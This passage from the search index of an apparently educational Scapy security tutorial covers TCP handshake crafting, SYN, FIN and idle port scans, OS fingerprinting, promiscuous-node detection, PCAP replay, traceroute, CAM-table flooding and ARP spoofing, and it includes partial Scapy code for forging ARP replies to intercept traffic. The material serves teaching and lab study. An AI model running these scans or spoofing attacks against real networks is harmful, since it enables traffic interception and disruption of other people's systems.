incremented server\u2019s sequence number value.   ack = TCP(sport=4000, dport=80, flags='A', seq='12346', ack=my_ack)\nack_pkt = ip/ack\nsend(ack_pkt)  If everything went right, we have just sucessfully established TCP three-way handshake   Why RST??   If you have noticed whenever we recieve a packet, our machine automatically responds with an RST packet.  The kernel is not aware of what Scapy is doing behind it s back(Scapy is userland program). If Scapy sends a SYN, the target replies with a SYN-ACK and your kernel sees it as unsolicited packet, it will reply with an RST.  To prevent this, use local firewall rules (e.g. NetFilter/IPtables for Linux). Scapy does not mind about local firewalls.   iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.1 -j DROP", 
            "title": "Crafting the Three-way Handshake in Scapy"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#syn-scan", 
            "text": "", 
            "title": "SYN scan"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#syn-scan-on-single-target-single-port", 
            "text": "We send packets using  sr1  function.  The response is just a single packet.  We use Scapy s  sprintf  method to print interesting fields in the response. ( SA  flags indicates open ports,  RA  flags indicates closed ports)    syn_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='S')  resp = sr1(syn_packet)  resp.sprintf('%TCP.src% \\t %TCP.sport% \\t %TCP.flags%')\n'192.168.56.102     4444      SA'", 
            "title": "SYN scan on single target, single port"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#syn-scan-on-single-target-multiple-ports", 
            "text": "We use  sr  functions send our packets.  sr  returns answered probes and unanswered probes that we assign to two variables.  ans  has all the answered probes in stimulus/response pairs(a tuple).  We use a simple lambda function to loop over the answered probes and print interesting fields.  In the below example, each entry in  ans  i.e. a stimuli response pair is passed on to a lambda function(stimuli   response as  s ,  r  respectively). Inside lambda function, we use sprintf to extract interesting fields.    ans, unans = sr(IP(dst= 192.168.56.90-110 )/TCP(dport=(20,24),flags= S ))  ans.summary( lambda(s,r): r.sprintf( %TCP.sport% \\t %TCP.flags% ) )\n'ftp_data    RA'\n'21          RA\n'ssh         SA'\n'telnet      RA'\n'24          RA'", 
            "title": "SYN scan on single target, multiple ports"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#syn-scan-on-multiple-targets-multiple-ports", 
            "text": "make_table  is an advanced feature in scapy that helps you visualize larger and complex scans.    ans,unans = sr(IP(dst=[ scanme.nmap.org , egadz.metasploit.com ])/TCP(dport=[10,20,30],flags= S ))   ans.make_table(lambda(s,r): (s.dst, s.dport,r.sprintf( %TCP.flags% )))\n\n   45.33.32.156 198.58.109.32 \n10 RA           SA            \n20 RA           SA            \n30 RA           SA", 
            "title": "SYN scan on multiple targets, multiple ports"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#fin-scan", 
            "text": "Fin scan on open port - scapy   fin_packet = IP(dst='192.168.56.102')/TCP(dport=4444,flags='F')  resp = sr1(fin_packet)\nBegin emission:\nFinished to send 1 packets.\n^C\nReceived 0 packets, got 0 answers, remaining 1 packets  Fin scan on closed port - scapy   fin_packet = IP(dst='192.168.56.102')/TCP(dport=6767,flags='F')  resp = sr1(fin_packet)  resp.sprintf('%TCP.flags%')\n'RA'", 
            "title": "Fin scan"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#null-scan", 
            "text": "", 
            "title": "Null scan"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#xmas-scan", 
            "text": "", 
            "title": "Xmas scan"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#udp-scan", 
            "text": "Exercise time - port scanning  Please solve Exercise 2 - Misc exercises", 
            "title": "UDP scan"
        }, 
        {
            "location": "/network_recon/service_discovery/index.html#ip-id-scan-nmap-idle-scan", 
            "text": "In 1998, security researcher Antirez posted to the Bugtraq mailing list an ingenious new port scanning technique.  Idle scan , as it has become known, allows for completely blind port scanning.  Attackers can actually scan a target without sending a single packet to the target from their own IP address!  Instead, a clever side-channel attack allows for the scan to be bounced off a dumb \u201czombie host\u201d. Intrusion detection system (IDS) reports will finger the innocent zombie as the attacker. \nIdle scan can be explained in following steps:    One way to determine whether a TCP port is open is to send a SYN (session establishment) packet to the port. The target machine will respond with a SYN/ACK (session request acknowledgment) packet if the port is open, and RST (reset) if the port is closed. This is the basis of the previously discussed SYN scan.    A machine that receives an unsolicited SYN/ACK packet will respond with a RST. An unsolicited RST will be ignored.    Every IP packet on the Internet has a fragment identification number (IP ID). Since many operating systems simply increment this number for each packet they send, probing for the IP ID can tell an attacker how many packets have been sent since the last probe.    By combining these traits, it is possible to scan a target network while forging your identity so that it looks like an innocent zombie machine did the scanning.      Exercise time - ipidseq   ipidscanner  Please solve Exercise 3   4 - Misc exercises", 
            "title": "IP ID Scan (nmap idle scan)"
        }, 
        {
            "location": "/network_recon/os_detection/index.html", 
            "text": "Remote OS Detection\n\n\nThere are two approaches to finger printing remote Operating Systems:\n\n\n\n\n\n\nActive OS finger printing\n\n\n\n\nActive finger printing is when attacker sends a series of TCP and UDP packets to the remote host and  examines practically every bit in the responses. After the tests the results are compared against the general behaviour of Operating Systems for a match.\n\n\nNmap is the most popular active OS detection tool. Nmap probes a target with large number of well crafted packets and the results are compared against Nmap\ns database of OS fingerprints (\nnmap-os-db\n).\n\n\nFor more details on Nmap\ns active OS detection techniques \nNmap OS Detection\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPassive OS fingerprinting\n\n\n\n\nPassive OS finger prining is analyzing network traffic to detect what operating system the client/server are running. This possible because of the difference in TCP/IP stack implemention in various operating systems. P0f is a popular passive finger printing tool with large database of finger prints.\n\n\nFor more details on p0f finger printing \nPassive OS finger printing with p0f\n \n\n\n\n\n\n\n\n\nActive OS finger printing\n\n\nDifferences in protocol implementations\n\n\nRFC 793 says:\n\nACK (1 bit) \u2013 indicates that the Acknowledgment field is significant. \nAll packets after the initial SYN packet sent by the client should have this flag set\n.\n\n\nBut, IP stacks are written for different OSs by different people who read the RFCs and then write their interpretation of what the RFC outlines into code. This leads to a difference in how IP stacks are implemeted across OSes.\n\n\nLinux implementation\n\n\nLinux kernel 2.4+ accepts and acknowledges a segment in an established session where no TCP flags are set and where the segment has payload\n No other well known current operating system accepts this same segment. \n\nThis behaviour of Linux network stack is complied into the kernel so it isn\nt easy to alter it. This makes it a very foolproof technique for remote Linux OS detection.\n\n\nThe Technique:\n\n\n\n\n\n\n\n\n\n\n\nEstablish a TCP three-way handshake with the target.\n\n\nAll we have to do after handshake is to create a segment with \nno TCP flags and add some payload\n and send it.\n\n\n\n\nPUSH=(sport=1024,dport=80,flags=\u201d\u201d,seq=12346,ack=my_ack)  # No flags set.\n\ndata=\u201dJUST A FILLER\u201d\n\nsend(ip/PUSH/data)\n\n\n\n\n\n\nIf the target is Linux server(2.4+ kernel), you\nll see an ACK bit set in the response.\n\n\nIn case of other operating systems, the response will most likely be a RST packet.\n\n\n\n\nPassive OS fingerprinting\n\n\nTTL \n Window size analysis", 
            "title": "OS detection"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#remote-os-detection", 
            "text": "There are two approaches to finger printing remote Operating Systems:    Active OS finger printing   Active finger printing is when attacker sends a series of TCP and UDP packets to the remote host and  examines practically every bit in the responses. After the tests the results are compared against the general behaviour of Operating Systems for a match.  Nmap is the most popular active OS detection tool. Nmap probes a target with large number of well crafted packets and the results are compared against Nmap s database of OS fingerprints ( nmap-os-db ).  For more details on Nmap s active OS detection techniques  Nmap OS Detection          Passive OS fingerprinting   Passive OS finger prining is analyzing network traffic to detect what operating system the client/server are running. This possible because of the difference in TCP/IP stack implemention in various operating systems. P0f is a popular passive finger printing tool with large database of finger prints.  For more details on p0f finger printing  Passive OS finger printing with p0f", 
            "title": "Remote OS Detection"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#active-os-finger-printing", 
            "text": "", 
            "title": "Active OS finger printing"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#differences-in-protocol-implementations", 
            "text": "RFC 793 says: ACK (1 bit) \u2013 indicates that the Acknowledgment field is significant.  All packets after the initial SYN packet sent by the client should have this flag set .  But, IP stacks are written for different OSs by different people who read the RFCs and then write their interpretation of what the RFC outlines into code. This leads to a difference in how IP stacks are implemeted across OSes.", 
            "title": "Differences in protocol implementations"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#linux-implementation", 
            "text": "Linux kernel 2.4+ accepts and acknowledges a segment in an established session where no TCP flags are set and where the segment has payload  No other well known current operating system accepts this same segment.  \nThis behaviour of Linux network stack is complied into the kernel so it isn t easy to alter it. This makes it a very foolproof technique for remote Linux OS detection.", 
            "title": "Linux implementation"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#the-technique", 
            "text": "Establish a TCP three-way handshake with the target.  All we have to do after handshake is to create a segment with  no TCP flags and add some payload  and send it.   PUSH=(sport=1024,dport=80,flags=\u201d\u201d,seq=12346,ack=my_ack)  # No flags set. data=\u201dJUST A FILLER\u201d send(ip/PUSH/data)   If the target is Linux server(2.4+ kernel), you ll see an ACK bit set in the response.  In case of other operating systems, the response will most likely be a RST packet.", 
            "title": "The Technique:"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#passive-os-fingerprinting", 
            "text": "", 
            "title": "Passive OS fingerprinting"
        }, 
        {
            "location": "/network_recon/os_detection/index.html#ttl-window-size-analysis", 
            "text": "", 
            "title": "TTL &amp; Window size analysis"
        }, 
        {
            "location": "/network_recon/promisc/index.html", 
            "text": "Promiscuous node detection\n\n\n\n\nYou have an attacker sitting in your internal network, listening to all the traffic, you are running against time to find him/shut him down! What do you do?\n\n\n\n\nPromiscuous mode\n\n\n\n\nPromiscuous mode allows a network device to intercept and read each network packet that arrives in its entirety.\n\n\n\n\nUnlike Monitor mode, in promisc mode the listener has to be connected to the network.\n\n\n\n\n\n\nSome tools that use promiscuous mode - Wireshark, Tcpdump, Aircrack-ng, cain and abel, Snort, VirtualBox\n\n\n\n\nExtremely effective because of it\ns passive nature.\n\n\n\n\nEnable promiscuous mode:\n\n\n$ sudo ifconfig \niface\n promisc   \n\n\n\n\nDisable promiscuous mode:\n\n\n$ sudo ifconfig \niface\n -promisc   \n\n\n\n\n\n\n Detecting promisc node -  The idea:\n\n\n\n\n\n\nAll the packets recieved by promisc NIC are passed on to the kernel, so the basic idea of detection is to send specially crafted packets that may trick the system kernel to respond to packets that it is not supposed to respond to in normal mode.\n\n\n\n\n\n\nFake ARP request packets, ICMP Ping(echo request) with wrong MAC but right IP address could do the job.\n\n\n\n\n\n\nHardware filter\n\n\nNormally,  NIC of a machine filters and accepts only packets that have destination address set to the NIC\ns own hardware address, broadcast address (FF FF FF FF FF FF), and multicast address 1(01 00 5E 00 00 01). Let\ns call this a hardware filter, where packets are filtered by NIC based of destination address.\n\n\n\nIn promiscuous mode, NIC is set to accept every packet that it recieves, like it has no hardware filtering.\n\n\n\n\nUsing the above information it should be easy to find promisc nodes, right? \n\nJust send packet using a destination address that is supposed to be filtered by hardware filter when in normal mode, only if a machine is in promisc mode, it would pass the packet to kernel without hardware filtering and would respond to that packet.\n\n\nLet\ns send an ARP packet to destination \n00:00:00:00:00:01\n. What happens??\n\n\n\n\nSoftware Filter\n\n\n\n\nOperating system kernels implement a filter, let\ns call it \nsoftware filter\n.\n\n\nEven though a packet passes through hardware filter, kernel is implementing another filter and this mechanism is filtering out some other addresses so we are not getting a response.\n\n\n\n\nBreaking Hardware filter \n Software filter\n\n\n\n\nThe hardware filter usually blocks packets that are not supposed to arrive to the system kernel. \n\n\n\n\nWe need to craft a packet that is:\n\na. Blocked by the hardware filter in normal mode, only passed to kernel in promisc mode.\n\nb. Should be able to pass the software filter.", 
            "title": "Promisc detection"
        }, 
        {
            "location": "/network_recon/promisc/index.html#promiscuous-node-detection", 
            "text": "You have an attacker sitting in your internal network, listening to all the traffic, you are running against time to find him/shut him down! What do you do?", 
            "title": "Promiscuous node detection"
        }, 
        {
            "location": "/network_recon/promisc/index.html#promiscuous-mode", 
            "text": "Promiscuous mode allows a network device to intercept and read each network packet that arrives in its entirety.   Unlike Monitor mode, in promisc mode the listener has to be connected to the network.    Some tools that use promiscuous mode - Wireshark, Tcpdump, Aircrack-ng, cain and abel, Snort, VirtualBox   Extremely effective because of it s passive nature.   Enable promiscuous mode:  $ sudo ifconfig  iface  promisc     Disable promiscuous mode:  $ sudo ifconfig  iface  -promisc", 
            "title": "Promiscuous mode"
        }, 
        {
            "location": "/network_recon/promisc/index.html#detecting-promisc-node-the-idea", 
            "text": "All the packets recieved by promisc NIC are passed on to the kernel, so the basic idea of detection is to send specially crafted packets that may trick the system kernel to respond to packets that it is not supposed to respond to in normal mode.    Fake ARP request packets, ICMP Ping(echo request) with wrong MAC but right IP address could do the job.", 
            "title": "Detecting promisc node -  The idea:"
        }, 
        {
            "location": "/network_recon/promisc/index.html#hardware-filter", 
            "text": "Normally,  NIC of a machine filters and accepts only packets that have destination address set to the NIC s own hardware address, broadcast address (FF FF FF FF FF FF), and multicast address 1(01 00 5E 00 00 01). Let s call this a hardware filter, where packets are filtered by NIC based of destination address.  In promiscuous mode, NIC is set to accept every packet that it recieves, like it has no hardware filtering.   Using the above information it should be easy to find promisc nodes, right?  \nJust send packet using a destination address that is supposed to be filtered by hardware filter when in normal mode, only if a machine is in promisc mode, it would pass the packet to kernel without hardware filtering and would respond to that packet.  Let s send an ARP packet to destination  00:00:00:00:00:01 . What happens??", 
            "title": "Hardware filter"
        }, 
        {
            "location": "/network_recon/promisc/index.html#software-filter", 
            "text": "Operating system kernels implement a filter, let s call it  software filter .  Even though a packet passes through hardware filter, kernel is implementing another filter and this mechanism is filtering out some other addresses so we are not getting a response.", 
            "title": "Software Filter"
        }, 
        {
            "location": "/network_recon/promisc/index.html#breaking-hardware-filter-software-filter", 
            "text": "The hardware filter usually blocks packets that are not supposed to arrive to the system kernel.    We need to craft a packet that is: \na. Blocked by the hardware filter in normal mode, only passed to kernel in promisc mode. \nb. Should be able to pass the software filter.", 
            "title": "Breaking Hardware filter &amp; Software filter"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html", 
            "text": "PCAP analysis\n\n\n\n\nScapy has pretty handy functions for handling PCAP files.\n\n\nAlthough there are dedicated tools like dpkt, pcapy etc to deal with packet captures(using Python), Scapy is still a go-to tool for PCAP aanalysis because of it\ns dense methods that aid you in number of packet analysis operations.\n\n\nAlthough Scapy is all powerful, it\ns takes a lot of memory when reading packets so analysing larger packet will take toll on your system memory.\n\n\n\n\nPCAP operations\n\n\n\n\nMemory matters!\n\n\n\n\nScapy looks at each packet as a class which takes toll on the system memory, so it is not a right choice for analysing large PCAPs\n\n\nWhen investigating large PCAP\ns(several Giga Bytes) use light-weight tools like Tshark for initial analysis, when investigation boils down to smaller set of packets, use Scapy.\n\n\n\n\n\n\nReading pcap\n\n\n\n\nYou can read a PCAP file in Scapy using \nrdpcap\n function.\n\n\n\n\n rdpcap('port_knock_seq.pcap')\n\nport_knock_seq.pcap: TCP:6 UDP:0 ICMP:0 Other:0\n\n\n\n\n\n pkts = sniff(offline=\ntemp.cap\n)\n\n\n\n\nWriting pcap\n\n\n\n\nYou can write a set of packets into a PCAP file  using \nwrpcap\n function.\n\n\n\n\n wrpcap(\nattack.pcap\n,packets)\n\n\n\n\nSimple tcp-replay tool\n\n\n\n\nYou can write a very simple tcp-replay tools in one line of scapy.\n\n\nThis piece of code send packets in a PCAP over the network, very handy in some forensic analysis situations.\n\n\n\n\n sendp(rdpcap(\n/tmp/pcapfile\n)) # tcpreplay\n...........\nSent 11 packets.\n\n\n\n\n\n\n\n\n\n\nExercise time - packet hunting\n\n\nPlease solve Exercise 5- packet hunting (Misc exercises)\n\n\nPlease solve Exercise 6 (Misc exercises)", 
            "title": "PCAP Analysis"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html#pcap-analysis", 
            "text": "Scapy has pretty handy functions for handling PCAP files.  Although there are dedicated tools like dpkt, pcapy etc to deal with packet captures(using Python), Scapy is still a go-to tool for PCAP aanalysis because of it s dense methods that aid you in number of packet analysis operations.  Although Scapy is all powerful, it s takes a lot of memory when reading packets so analysing larger packet will take toll on your system memory.", 
            "title": "PCAP analysis"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html#pcap-operations", 
            "text": "Memory matters!   Scapy looks at each packet as a class which takes toll on the system memory, so it is not a right choice for analysing large PCAPs  When investigating large PCAP s(several Giga Bytes) use light-weight tools like Tshark for initial analysis, when investigation boils down to smaller set of packets, use Scapy.", 
            "title": "PCAP operations"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html#reading-pcap", 
            "text": "You can read a PCAP file in Scapy using  rdpcap  function.    rdpcap('port_knock_seq.pcap') port_knock_seq.pcap: TCP:6 UDP:0 ICMP:0 Other:0    pkts = sniff(offline= temp.cap )", 
            "title": "Reading pcap"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html#writing-pcap", 
            "text": "You can write a set of packets into a PCAP file  using  wrpcap  function.    wrpcap( attack.pcap ,packets)", 
            "title": "Writing pcap"
        }, 
        {
            "location": "/network_recon/pcap_analysis/index.html#simple-tcp-replay-tool", 
            "text": "You can write a very simple tcp-replay tools in one line of scapy.  This piece of code send packets in a PCAP over the network, very handy in some forensic analysis situations.    sendp(rdpcap( /tmp/pcapfile )) # tcpreplay\n...........\nSent 11 packets.     Exercise time - packet hunting  Please solve Exercise 5- packet hunting (Misc exercises)  Please solve Exercise 6 (Misc exercises)", 
            "title": "Simple tcp-replay tool"
        }, 
        {
            "location": "/network_recon/traceroute/index.html", 
            "text": "Traceroute\n\n\n\n\nTraceroute is a tool/technique to list all the routers that your packets go through to reach a target.\n\n\nThe technique is to send series of packets to the target with Time to Live (TTL) set in such a way that each router on the path will have to notify you of the death of the packet.\n\n\nThe traceroute technique is based on the way the IP protocol is designed. TTL value in IP header is seen as hop limit. Everytime a router recieves a packet to forward, it decrements the TTL by one and forwards the packet. When TTL reaches 0, the router will send a reply to the source machine indicating the packet has died.\n\n\nThe technique behind various tools is same but the way they implement it slightly differs. Unix systems use UDP datagrams while the Windows \ntracert\n program uses ICMP and \ntcptraceroute\n uses TCP.\n\n\n\n\n\n\n\n\n\n\nMost traceroute tools tend to send a packet with ceratin TTL value and wait for a reply before sending out the next packet which could slow down the whole process, especially when there is a network note that is unresponsive.\n\n\n\n\n\n\nIn this example, we are going to do a Standard ICMP Traceroute but we will send all our probes at the same time.\n\n\n\n\nOne obvious question, \nWhere do we stop?\n For this exercises we\nll just send packets till TTL 30 and that is a decent number to reach almost any node on Internet.\n\n\n\n\n ans,unans=sr(IP(dst=\n4.2.2.1\n,ttl=(1,10))/ICMP())\n\n\n\n\n\n\nOnce, we receive all probe requests we can obtain results:\n\n\n\n\n ans.summary( lambda(s,r) : r.sprintf(\n%IP.src%\n))\n192.168.1.1\n68.88.88.88\n68.60.60.60\n4.79.43.134\n4.79.43.133\n4.68.18.62\n4.68.123.6\n4.2.2.1\n4.2.2.1\n\n\n\n\n\n\nSimilarly, we can use TCP SYN traceroute to obtain similar results:\n\n\n\n\nans,unans=sr(IP(dst=\n4.2.2.1\n,ttl=(1,10))/TCP(dport=53,flags=\nS\n))\n\n\n\n\n\n\nAnd again results would be:\n\n\n\n\n ans.summary( lambda(s,r) : r.sprintf(\n%IP.src%\\t{ICMP:%ICMP.type%}\\t{TCP:%TCP.flags%}\n))\n192.168.1.1     time-exceeded\n68.86.90.162    time-exceeded\n4.79.43.134     time-exceeded\n4.79.43.133     time-exceeded\n4.68.18.126     time-exceeded\n4.68.123.38     time-exceeded\n4.2.2.1         SA\n\n\n\n\n\n\nScapy includes a built-in traceroute() function to perform same functionality as above. Here is an example of TCP SYN traceroute:\n\n\n\n\n traceroute(\n4.2.2.1\n)\nBegin emission:\n***********************Finished to send 30 packets.\n****\nReceived 27 packets, got 27 answers, remaining 3 packets\n   4.2.2.1:tcp80      \n1  192.168.1.1     11 \n5  4.79.43.134     11 \n6  4.79.43.133     11 \n7  4.68.18.62      11 \n8  4.68.123.6      11 \n9  4.2.2.1         RA \n10 4.2.2.1         RA \n...\n\n\n\n\n\n\nWe can perform a DNS traceroute by specifying a complete packet in l4 parameter of traceroute() function:\n\n\n\n\n ans,unans=traceroute(\n4.2.2.1\n,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=\nthesprawl.org\n)))\nBegin emission:\n..*....******...******.***...****Finished to send 30 packets.\n*****...***...............................\nReceived 75 packets, got 28 answers, remaining 2 packets\n   4.2.2.1:udp53      \n1  192.168.1.1     11 \n4  68.86.90.162    11 \n5  4.79.43.134     11 \n6  4.79.43.133     11 \n7  4.68.18.62      11 \n8  4.68.123.6      11 \n9  4.2.2.1            \n...\n\n\n\n\n\n\nSimilarly, IP Fragment traceroute can be emulated with this command:\n\n\n\n\n res,unans = sr(IP(dst=\n4.2.2.1\n, ttl=(5,10), flags=\nMF\n)\n...                /UDP(sport=RandShort( ), dport=53), timeout=125)\n\nNote: I couldn't produce Type 11 Code 1 (Time Exceeded During Reassembly) ICMP error.\n\n\n\n\nNAT detect", 
            "title": "Traceroute"
        }, 
        {
            "location": "/network_recon/traceroute/index.html#traceroute", 
            "text": "Traceroute is a tool/technique to list all the routers that your packets go through to reach a target.  The technique is to send series of packets to the target with Time to Live (TTL) set in such a way that each router on the path will have to notify you of the death of the packet.  The traceroute technique is based on the way the IP protocol is designed. TTL value in IP header is seen as hop limit. Everytime a router recieves a packet to forward, it decrements the TTL by one and forwards the packet. When TTL reaches 0, the router will send a reply to the source machine indicating the packet has died.  The technique behind various tools is same but the way they implement it slightly differs. Unix systems use UDP datagrams while the Windows  tracert  program uses ICMP and  tcptraceroute  uses TCP.      Most traceroute tools tend to send a packet with ceratin TTL value and wait for a reply before sending out the next packet which could slow down the whole process, especially when there is a network note that is unresponsive.    In this example, we are going to do a Standard ICMP Traceroute but we will send all our probes at the same time.   One obvious question,  Where do we stop?  For this exercises we ll just send packets till TTL 30 and that is a decent number to reach almost any node on Internet.    ans,unans=sr(IP(dst= 4.2.2.1 ,ttl=(1,10))/ICMP())   Once, we receive all probe requests we can obtain results:    ans.summary( lambda(s,r) : r.sprintf( %IP.src% ))\n192.168.1.1\n68.88.88.88\n68.60.60.60\n4.79.43.134\n4.79.43.133\n4.68.18.62\n4.68.123.6\n4.2.2.1\n4.2.2.1   Similarly, we can use TCP SYN traceroute to obtain similar results:   ans,unans=sr(IP(dst= 4.2.2.1 ,ttl=(1,10))/TCP(dport=53,flags= S ))   And again results would be:    ans.summary( lambda(s,r) : r.sprintf( %IP.src%\\t{ICMP:%ICMP.type%}\\t{TCP:%TCP.flags%} ))\n192.168.1.1     time-exceeded\n68.86.90.162    time-exceeded\n4.79.43.134     time-exceeded\n4.79.43.133     time-exceeded\n4.68.18.126     time-exceeded\n4.68.123.38     time-exceeded\n4.2.2.1         SA   Scapy includes a built-in traceroute() function to perform same functionality as above. Here is an example of TCP SYN traceroute:    traceroute( 4.2.2.1 )\nBegin emission:\n***********************Finished to send 30 packets.\n****\nReceived 27 packets, got 27 answers, remaining 3 packets\n   4.2.2.1:tcp80      \n1  192.168.1.1     11 \n5  4.79.43.134     11 \n6  4.79.43.133     11 \n7  4.68.18.62      11 \n8  4.68.123.6      11 \n9  4.2.2.1         RA \n10 4.2.2.1         RA \n...   We can perform a DNS traceroute by specifying a complete packet in l4 parameter of traceroute() function:    ans,unans=traceroute( 4.2.2.1 ,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname= thesprawl.org )))\nBegin emission:\n..*....******...******.***...****Finished to send 30 packets.\n*****...***...............................\nReceived 75 packets, got 28 answers, remaining 2 packets\n   4.2.2.1:udp53      \n1  192.168.1.1     11 \n4  68.86.90.162    11 \n5  4.79.43.134     11 \n6  4.79.43.133     11 \n7  4.68.18.62      11 \n8  4.68.123.6      11 \n9  4.2.2.1            \n...   Similarly, IP Fragment traceroute can be emulated with this command:    res,unans = sr(IP(dst= 4.2.2.1 , ttl=(5,10), flags= MF )\n...                /UDP(sport=RandShort( ), dport=53), timeout=125)\n\nNote: I couldn't produce Type 11 Code 1 (Time Exceeded During Reassembly) ICMP error.", 
            "title": "Traceroute"
        }, 
        {
            "location": "/network_recon/traceroute/index.html#nat-detect", 
            "text": "", 
            "title": "NAT detect"
        }, 
        {
            "location": "/network_attacks/cam_overflow/index.html", 
            "text": "CAM overflow/ MAC flooding attack\n\n\nBackground\n\n\n\n\nContent Addressable Memory (CAM) Table Overflow is a Layer 2 attack on a switch.\n\n\nA switch\ns CAM table contains network information such as MAC addresses available on physical switch ports and associated VLAN parameters.\n\n\nMAC address flooding attack (CAM table flooding attack) is a type of network attack where an attacker connected to a switch port floods the switch interface with very large number of Ethernet frames with different fake source MAC address.\n\n\nCAM Table Overflows occur when an influx of MAC addresses are flooded into the table and the CAM table threshold is reached. This causes the switch to act like a hub, flooding the network with traffic out all ports.\n\n\n\n\nMore about CAM over flow: \nCAM overflow\n\n\n\n\nMAC address flooding exploits the memory and hardware limitations in a switch\ns CAM table.\n\n\nSwitchs are able to store numerous amounts of entries in the CAM table, however, once the resources are exhausted, the traffic is flooded out on all ports(or source VLAN), as the CAM table can no longer store MAC addresses, thus is no longer able to locate the MAC destination MAC address within a packet.\n\n\nAn attacker is able to exploit this limitation by flooding the switch with an influx of (mostly invalid) MAC addresses, until the CAM tables resources are depleted. - When the aforementioned transpires, the switch has no choice but to flood all ports with all incoming traffic. This is due to the fact that it cannot find the switch port number for a corresponding MAC address within the CAM table. By definition, the switch, acts like, and becomes a hub.\n\n\n\n\nExploitation\n\n\n\n\nCAM overflow attacks are very trivial and are very easy to lauch.\n\n\nTools like macof(part of dsniff suite) make it even easier to exploit.\n\n\nTo make the attacks reliable have an IP payload with random source and destination IP addresses.", 
            "title": "CAM overflow"
        }, 
        {
            "location": "/network_attacks/cam_overflow/index.html#cam-overflow-mac-flooding-attack", 
            "text": "", 
            "title": "CAM overflow/ MAC flooding attack"
        }, 
        {
            "location": "/network_attacks/cam_overflow/index.html#background", 
            "text": "Content Addressable Memory (CAM) Table Overflow is a Layer 2 attack on a switch.  A switch s CAM table contains network information such as MAC addresses available on physical switch ports and associated VLAN parameters.  MAC address flooding attack (CAM table flooding attack) is a type of network attack where an attacker connected to a switch port floods the switch interface with very large number of Ethernet frames with different fake source MAC address.  CAM Table Overflows occur when an influx of MAC addresses are flooded into the table and the CAM table threshold is reached. This causes the switch to act like a hub, flooding the network with traffic out all ports.   More about CAM over flow:  CAM overflow   MAC address flooding exploits the memory and hardware limitations in a switch s CAM table.  Switchs are able to store numerous amounts of entries in the CAM table, however, once the resources are exhausted, the traffic is flooded out on all ports(or source VLAN), as the CAM table can no longer store MAC addresses, thus is no longer able to locate the MAC destination MAC address within a packet.  An attacker is able to exploit this limitation by flooding the switch with an influx of (mostly invalid) MAC addresses, until the CAM tables resources are depleted. - When the aforementioned transpires, the switch has no choice but to flood all ports with all incoming traffic. This is due to the fact that it cannot find the switch port number for a corresponding MAC address within the CAM table. By definition, the switch, acts like, and becomes a hub.", 
            "title": "Background"
        }, 
        {
            "location": "/network_attacks/cam_overflow/index.html#exploitation", 
            "text": "CAM overflow attacks are very trivial and are very easy to lauch.  Tools like macof(part of dsniff suite) make it even easier to exploit.  To make the attacks reliable have an IP payload with random source and destination IP addresses.", 
            "title": "Exploitation"
        }, 
        {
            "location": "/network_attacks/arp_spoofing/index.html", 
            "text": "ARP Spoofing(MiTM)\n\n\n\n\nMessing with ARP\n\n\n\n\nARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)\n\n\nFortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left. \n\n\n\n\n\n\n\n\nIn common hub networks all traffic can be seen by all hosts whose NICs (network interface card) are in promiscuous mode, but things are a bit different on switched networks.\n\n\nA switch looks at the data sent to it and tries to only forward packets to its intended recipient based on the MAC address.\n\n\nSwitched networks are more secure and help speed up the network by only sending packets where they need to go.\n\n\nThere are ways around switches though. Using a program like Arpspoof (part of the Dsniff package), we can lie to other machines on the local area network and tell them we have the IP they are looking for, thus funneling their traffic through us.\n\n\n\n\n\n\n\n\n\n\n\n\n\nIn the above image, the attacker is telling Alan\ns box that he has the IP that corresponds to Brian\ns box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN\ns gateway an attacker can see all the traffic the computer is sending out and receiving.\n\n\n\n\nStep I- IP forwarding\n\n\n\n\nMake sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.(\nIP forwarding\n is a synonym for \nrouting.\n It is called \nkernel IP forwarding\n because it is a feature of the Linux kernel.)\n\n\n\n\n import os\n\n os.system('echo 1 \n /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding\n\n os.system('echo 0 \n /proc/sys/net/ipv4/ip_forward')           # disable kernel IP forwarding\n\n\n\n\nMore on kernel IP forwarding: \nWhat is kernel IP forwarding?\n\n\nStep II - Gather MAC addresses\n\n\nIn order to create our ARP responses, we\nll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.\n\n\ndef get_mac(IP):\n    ans, unans = srp(Ether(dst = \nff:ff:ff:ff:ff:ff\n)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n    for snd,rcv in ans:\n        return rcv.sprintf(r\n%Ether.src%\n)\n\n\n\n\nStep III - Tricking the Targets\n\n\nIn this step we are tricking eachmachine into thinking that the other party is our machine. \nARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.\n\n\ndef trick(gm, vm):\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, 